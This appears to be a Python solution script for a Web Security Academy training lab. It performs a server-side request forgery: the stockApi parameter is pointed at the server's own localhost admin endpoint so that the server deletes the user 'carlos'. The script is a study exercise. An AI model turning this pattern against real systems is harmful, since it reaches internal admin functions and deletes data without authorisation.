# usage:
# python3 3.py \
# --u https://0aaa00a7037819be80f76c960063008a.web-security-academy.net \
# --w carlos

from argparse import ArgumentParser

import requests


class Solution:
    def __init__(self, url: str, who: str) -> None:
        self.url = url.rstrip("/")
        self.who = who

    def solve(self) -> None:
        self.s = requests.Session()
        self.s.post(
            f"{self.url}/product/stock",
            data={"stockApi": f"http://localhost/admin/delete?username={self.who}"},
        )


def main():
    parser = ArgumentParser()
    parser.add_argument("--u", "--url", dest="url")
    parser.add_argument("--w", "--who", dest="who")
    args = parser.parse_args()
    s = Solution(args.url, args.who)
    s.solve()


if __name__ == "__main__":
    main()
